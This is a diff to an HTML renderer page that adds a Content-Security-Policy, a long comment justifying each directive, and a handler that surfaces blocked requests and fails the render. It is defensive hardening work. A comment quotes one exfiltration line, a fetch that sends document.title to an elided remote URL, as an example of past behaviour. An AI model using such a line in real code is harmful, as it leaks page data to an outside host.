@@ -2,6 +2,86 @@
 <meta charset="utf-8">
 <title>The Brief</title>
 <!--
+  The page cannot reach the network. `custom` beats execute JavaScript written
+  upstream of a human — a fetched source reaches the corpus, the storyboard
+  skill reads it and writes the beat — and before this policy a beat could and
+  did `fetch('https://…?x=' + document.title)` from the operator's machine.
+
+  It lives HERE, in the page, not in render.mjs: scene.html is also opened by
+  hand to scrub the slider, and a runner-side block would leave that open.
+
+  Directive by directive — each is as loose as it is for a reason, because a
+  policy nobody can explain is a policy nobody will maintain:
+
+    default-src 'self'   the floor. Over file:// Chromium still matches the
+                         page's own directory, so engine.js, planbuild.js,
+                         .plan.js and content/*.js load; nothing remote does.
+    script-src           'unsafe-inline' because this file's own bootstrap is
+                         inline and document.write()s the day's script;
+                         'unsafe-eval' because buildCustom uses `new Function`,
+                         which IS the custom beat. Removing either breaks the
+                         renderer, and neither is a hole a CSP was closing:
+                         a custom beat's code was always going to run. This
+                         policy stops it PHONING HOME, nothing more.
+    style-src            'unsafe-inline' for the <style> block above and for
+                         every el.style.* the engine writes on seek — the whole
+                         animation system is inline style attributes.
+    img-src / font-src   'self'. Measured: the engine loads no image and no
+                         webfont at all, so this is already stricter than it
+                         needs to be; if a local asset is ever added it keeps
+                         working, and a remote one is refused.
+    connect-src 'none'   fetch, XHR, sendBeacon, EventSource, WebSocket.
+    frame-src, child-src an <iframe> is a fresh document with its own network,
+    worker-src 'none'    and a Worker is a thread with its own fetch.
+    object-src, media-src nothing here needs a plugin, a video, or a manifest,
+    manifest-src 'none'  and each is a way to name a URL.
+    base-uri 'none'      or a beat rewrites <base> and every relative script
+                         path in this file resolves somewhere else.
+    form-action 'none'   a submitted form is an outbound request with a body.
+
+  Not expressible here: frame-ancestors and sandbox are ignored in a <meta>
+  policy, and no directive stops a top-level navigation to an attacker URL.
+  See the Task 4 report, section 5.
+-->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self';
+  font-src 'self';
+  connect-src 'none';
+  frame-src 'none';
+  child-src 'none';
+  worker-src 'none';
+  object-src 'none';
+  media-src 'none';
+  manifest-src 'none';
+  base-uri 'none';
+  form-action 'none'
+">
+<script>
+  /* A refusal has to be VISIBLE, or a render goes green with an exfiltration
+     attempt inside it. Three audiences, three channels: #csp for the operator
+     scrubbing the slider (it sits in the scrubber bar, which the render hides,
+     so it can never reach a frame), console.error for anyone with devtools
+     open, and a rethrow on a fresh task so it becomes an uncaught error —
+     which is what render.mjs's `pageerror` collector prints and exits on.
+     First script in the file, so a violation while the rest of it parses is
+     still caught. */
+  window.__cspViolations = [];
+  document.addEventListener('securitypolicyviolation', function (e) {
+    var msg =
+      'Content-Security-Policy refused ' + (e.blockedURI || '(inline)') +
+      ' (' + e.violatedDirective + ')' +
+      (e.sourceFile ? ' from ' + e.sourceFile + ':' + e.lineNumber : '');
+    window.__cspViolations.push(msg);
+    console.error(msg);
+    var el = document.getElementById('csp');
+    if (el) { el.hidden = false; el.textContent = window.__cspViolations.length + ' blocked · ' + msg; }
+    setTimeout(function () { throw new Error(msg); }, 0);
+  });
+</script>
+<!--
   Deterministic 9:16 stage. window.__seek(t) positions EVERY element from t alone.
   No CSS keyframes, no Date.now(), no randomness — so any frame is reproducible.
 
@@ -171,6 +251,9 @@
   #ui{position:fixed;left:0;right:0;bottom:0;padding:10px;background:#111;z-index:99}
   #ui input{width:100%}
   body.render #ui{display:none}
+  /* a blocked request, said out loud. Inside #ui, so the render never sees it. */
+  #csp{font:600 13px/1.4 ui-monospace,Menlo,monospace;color:#FF6B4A;padding:6px 2px 8px;
+    word-break:break-all}
 </style>
 
 <div id="stage">
@@ -189,7 +272,10 @@
   <div id="by"></div>
 </div>
 
-<div id="ui"><input type="range" id="sl" min="0" max="1000" value="0"></div>
+<div id="ui">
+  <div id="csp" hidden></div>
+  <input type="range" id="sl" min="0" max="1000" value="0">
+</div>
 
 <script src="engine.js"></script>
 <script src="planbuild.js"></script>
